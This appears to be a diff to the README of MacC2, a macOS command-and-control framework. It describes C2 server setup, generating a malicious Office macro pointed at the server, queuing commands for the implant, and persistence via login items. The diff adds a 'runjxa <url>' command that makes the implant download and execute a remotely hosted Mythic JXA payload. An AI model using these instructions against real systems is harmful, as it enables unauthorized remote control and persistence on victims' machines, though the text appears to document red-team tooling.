@@ -7,6 +7,8 @@ Since the MacC2 server uses the aiohttp library for communications, you will nee
 
 _*pip install aiohttp (if you encounter an error ensure that pip is pointing to python3, since aiohttp is a python3 library): python3 -m pip install --upgrade --force pip*_
 
+----------
+
 More info below:
 
 **_On C2 Server:_**
@@ -43,6 +45,8 @@ Usage: python3 macro_generatory.py -s [C2 Server IP/domain] -p [C2 Server Port]
 
 ![Image](pic6.png)
 
+----------
+
 ***Using MacC2***
 
 After you receive a connection, you can use the "help" command on the server to get a list of built-in commands available. You can enter one of these commands. After entering a command and pressing Enter, the command is queued up (allows you to enter multiple commands to be executed by the client). Once you type "done" and hit Enter, all of the queued commands will be sent to the client for execution.
@@ -51,6 +55,13 @@ After you receive a connection, you can use the "help" command on the server to 
 
 Each command is pretty straightforward. The command options that are not OPSEC safe (i.e., command line executions or cause pop ups) are also flagged in red from the help menu.
 
+Functions of Note:
+
+- You can generate a Mythic C2 JXA .js payload, download it, and host it on a remote server. Then you can provide the url to the hosted file to MacC2 using the **runjxa** command to have MacC2 download and execute the Mythic .JXA payload:
+
+**>>> runjxa <url_to_JXA_.js_payload>**
+
+- Note: If you gain access using the MS Office macro, then the persistence method will not work due to sandboxing. The files will still be dropped and the login item will still be inserted but upon reboot the quarantine attribute prevents the persistence from executing.
 ----------
 
 **_Additional Info_**
@@ -78,7 +89,9 @@ The operator flow after setting everything up and getting a callback is:
 
 **_Macro Limitations_**
 
-MacC2 does NOT include any sandbox escapes and therefore all functions do not work when access is gained via the Office macro. Functions that do work include:
+MacC2 does NOT include any sandbox escapes and therefore all functions do not work when access is gained via the Office macro. Functions that DO work from the sandbox include:
+
+- runjxa 
 
 - systeminfo
 
